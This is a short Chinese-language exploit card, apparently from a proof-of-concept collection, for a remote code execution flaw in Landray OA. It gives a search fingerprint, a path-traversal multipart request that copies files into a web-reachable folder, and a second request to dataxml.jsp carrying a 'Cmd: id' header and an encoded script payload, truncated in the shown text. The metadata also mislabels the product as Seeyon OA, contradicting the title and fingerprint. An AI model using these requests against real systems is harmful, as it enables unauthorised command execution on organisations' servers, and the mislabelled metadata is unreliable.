# 蓝凌OA文件Copy导致远程代码执行漏洞

- **系统**：致远OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="Landray-OA系统"`
- **请求**：`POST /sys/ui/sys_ui_component/sysUiComponent.do HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryL7ILSpOd…`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
------WebKitFormBoundaryL7ILSpOdIhIIvL51
Content-Disposition: form-data; name="method"
replaceExtend
------WebKitFormBoundaryL7ILSpOdIhIIvL51
Content-Disposition: form-data; name="extendId"
../../../../resource/help/km/review/
------WebKitFormBoundaryL7ILSpOdIhIIvL51
Content-Disposition: form-data; name="folderName"
../../../ekp/sys/common
------WebKitFormBoundaryL7ILSpOdIhIIvL51--
**RCE漏洞**
POST /resource/help/km/review/dataxml.jsp HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Cmd: id
s_bean=ruleFormulaValidate&script=\u0020\u0020\u0020\u0020\u0062\u006f\u006f\u006c\u0065\u00…（脚本共 17915 字，完整版见原文）
```
- **预期**：200　|　EXecute